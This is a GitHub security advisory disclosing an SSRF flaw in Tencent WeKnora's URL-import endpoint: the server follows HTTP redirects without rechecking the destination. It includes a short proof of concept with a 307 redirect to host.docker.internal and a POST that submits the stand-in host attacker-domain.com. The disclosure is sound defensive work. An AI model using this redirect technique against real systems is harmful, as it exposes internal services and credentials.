# [M] WeKnora is Vulnerable to SSRF via Redirection

## Summary
Severity: Medium
Advisory: GHSA-595m-wc8g-6qgc
CVE: CVE-2026-30247
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-595m-wc8g-6qgc
Type: github-advisory

## Affected
- Go: `github.com/Tencent/WeKnora` — affected >=0 <0.2.12

## Details
### Summary

The application's "Import document via URL" feature is vulnerable to Server-Side Request Forgery (SSRF) through HTTP redirects. While the backend implements comprehensive URL validation (blocking private IPs, loopback addresses, reserved hostnames, and cloud metadata endpoints), it **fails to validate redirect targets**. An attacker can bypass all protections by using a redirect chain, forcing the server to access internal services. Additionally, Docker-specific internal addresses like `host.docker.internal` are not blocked.

### Details

The `/api/v1/knowledge-bases/{id}/knowledge/url` endpoint validates the initial URL but follows HTTP redirects without re-validating the destination. This allows attackers to:
1. Submit a URL to an attacker-controlled domain (passes validation)
2. Have that domain respond with a 307 redirect to an internal service
3. The backend automatically follows the redirect without checking if the destination is restricted
4. The internal service response is exposed to the attacker

### Validation Gaps
- The `IsSSRFSafeURL()` function (in `internal/utils/security.go`) validates the initial URL thoroughly, but there's no validation of HTTP redirect targets
- `host.docker.internal` is not in the `restrictedHostnames` list
- Docker-specific IP ranges (172.17.0.0/16 for bridge networks) are not explicitly blocked
- The code validates `parsed.Hostname()` from the initial URL, but redirect Location headers bypass this check

### Root Cause Analysis
The backend makes the security mistake of trusting the server's HTTP client library to be secure. In Go, when using http.Get() or similar functions, the standard library will automatically follow redirects up to 10 times by default. The SSRF validation only checks the URL passed to the endpoint, not intermediate redirects.

### PoC

**Step 1**: Set up an attacker-controlled server that responds with a redirect:

```http
HTTP/1.1 307 Temporary Redirect
Location: http://host.docker.internal:7777
Content-Type: text/html
Access-Control-Allow-Origin: *
```
**Step 2**: Send the request with a clean URL:

```http
POST /api/v1/knowledge-bases/dbadd153-9e60-4213-9553-9f78dbcba0dc/knowledge/url HTTP/1.1
Host: localhost
Content-Type: application/json
Authorization: Bearer <valid_token>

{"url":"https://attacker-domain.com","tag_id":""}
```

The URL `https://attacker-domain.com` passes all validation checks because:
✓ Valid `https://` scheme
✓ Not an IP address (it's a domain)
✓ Not in restricted hostnames
✓ Doesn't resolve to a private IP (assuming attacker controls a public domain)

**Step 3**: The backend's HTTP client follows the redirect to `http://host.docker.internal:7777`, which:
✗ Is not validated
✗ `host.docker.internal` is not in the blocklist
✗ Successfully accesses the internal service

### Impact

Vulnerability Type: Server-Side Request Forgery (SSRF) via HTTP Redirect

**Who is Impacted**:
- The organization running the application
- Internal services and databases accessible from the application container
- Services in the Docker network (other containers, internal infrastructure)
- Sensitive data stored in internal services

**Potential Consequences**:
- Access to internal databases (PostgreSQL, MongoDB, MySQL) running in Docker
- Information disclosure from internal services (Redis cache, configuration servers)
- Access to Docker container metadata and environment variables
- Lateral movement to other containers in the same Docker network
- Exfiltration of sensitive configuration, API keys, or database credentials
- Potential RCE if internal services have exploitable vulnerabilities

## References
- https://github.com/Tencent/WeKnora/security/advisories/GHSA-595m-wc8g-6qgc
- https://nvd.nist.gov/vuln/detail/CVE-2026-30247
- https://github.com/Tencent/WeKnora
